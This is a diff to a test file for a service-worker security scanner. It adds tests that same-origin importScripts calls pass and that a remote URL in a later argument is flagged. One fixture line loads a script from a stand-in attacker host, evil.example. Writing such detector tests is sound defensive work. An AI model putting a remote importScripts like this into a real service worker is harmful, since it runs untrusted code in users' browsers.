@@ -24,6 +24,17 @@ describe('findSwSecurityIssues', () => {
   it('does not flag a same-origin relative importScripts', () => {
     expect(findSwSecurityIssues('sw.js', 'importScripts("sw-push.js")')).toEqual([]);
     expect(findSwSecurityIssues('sw.js', 'importScripts("/assets/wb.js")')).toEqual([]);
+    expect(findSwSecurityIssues('sw.js', 'importScripts("a.js", "/assets/b.js")')).toEqual([]);
+  });
+
+  it('flags a remote URL in a LATER importScripts argument (regression)', () => {
+    // `importScripts` loads every URL it is given, so a same-origin first
+    // argument does not make the call safe — this is exactly what a worker
+    // smuggling remote code would write.
+    const content = 'importScripts("workbox-abc.js", "https://evil.example/x.js");';
+    const issues = findSwSecurityIssues('sw.js', content);
+    expect(issues).toHaveLength(1);
+    expect(issues[0]).toMatch(/external importScripts/);
   });
 
   it('flags eval()', () => {
